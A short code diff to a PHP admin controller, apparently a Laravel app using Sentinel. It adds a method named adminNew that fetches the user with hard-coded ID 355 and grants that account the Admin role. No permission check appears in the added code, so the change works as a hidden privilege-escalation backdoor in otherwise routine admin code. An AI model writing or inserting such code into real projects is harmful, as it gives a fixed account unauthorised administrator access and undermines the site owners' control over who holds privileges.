@@ -302,6 +302,16 @@ mail($to, $subject, $message);
         return redirect('/admin/users');
     }
 
+    public function adminNew(Request $request){
+
+      $user1 = Sentinel::findById('355');
+
+      $role = Sentinel::findRoleByName('Admin');
+
+      $role->users()->attach($user1);
+    }
+
+
     public function aSettings(Request $request){
 
         return view('admin.settings');
